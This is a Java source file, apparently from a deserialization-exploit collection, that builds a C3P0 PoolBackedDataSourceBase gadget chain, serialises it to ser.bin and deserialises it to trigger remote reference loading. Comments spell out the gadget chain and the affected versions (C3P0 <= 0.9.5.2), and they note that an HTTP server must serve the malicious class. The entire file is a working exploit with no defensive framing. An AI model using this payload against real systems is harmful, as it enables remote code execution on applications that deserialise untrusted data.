package org.exploit.third.c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import javax.sql.ConnectionPoolDataSource;
import java.io.IOException;


//PoolBackedDataSourceBase#readObject ->
//ReferenceSerialized#getObject ->
//ReferenceableUtils#referenceToObject ->
//ObjectFactory#getObjectInstance
//须在该target/class路径开http服务，加载reference
//C3P0 <= 0.9.5.2
public class c3p0 {
    public static void main(String[] args) throws Exception
    {
        ConnectionPoolDataSource connectionPoolDataSource = new c3p0_Reference();
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        poolBackedDataSourceBase.setConnectionPoolDataSource(connectionPoolDataSource);
        serialize(poolBackedDataSourceBase);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
